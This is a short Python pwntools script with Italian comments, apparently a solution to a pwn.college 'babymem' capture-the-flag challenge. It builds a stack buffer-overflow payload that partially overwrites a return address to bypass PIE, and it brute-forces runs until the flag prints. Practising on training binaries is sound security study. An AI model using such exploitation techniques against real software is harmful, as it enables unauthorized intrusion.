from pwn import *

elf = ELF("/challenge/babymem-level-9-1")
p = elf.process()

# Buffer di input
buffer_size = 96
padding_size =  1 # Padding fino alla return address (88 byte)



# Ultimi 2 byte della return address (da modificare per PIE)
return_address_overwrite = b"\x4f\x8d"  # Modifica questi 2 byte per l'indirizzo corretto

# Creazione del payload
payload = b'A' * buffer_size   # Riempie il buffer
payload += b'\x00' * 4 #all'interno di n ci deve essere l'indirizzo a cui voglio saltare
# quindi buffer + 0x77 = 119 non deve esserci altro
payload += b'\x77' # Padding fino alla return address

payload += return_address_overwrite  # Modifica gli ultimi 2 byte della return address

# Stampa la dimensione del payload
print(f"Payload size: {len(payload)}")  

while True:
    p = elf.process()
    p.sendline(b"122")

 
    p.sendline(payload)
    p.recvuntil(b"Goodbye!")
    flag = p.recvall().decode()
    if 'pwn.college' in flag:
        print(flag)
        break
# Interagisci con il programma
#p.interactive()
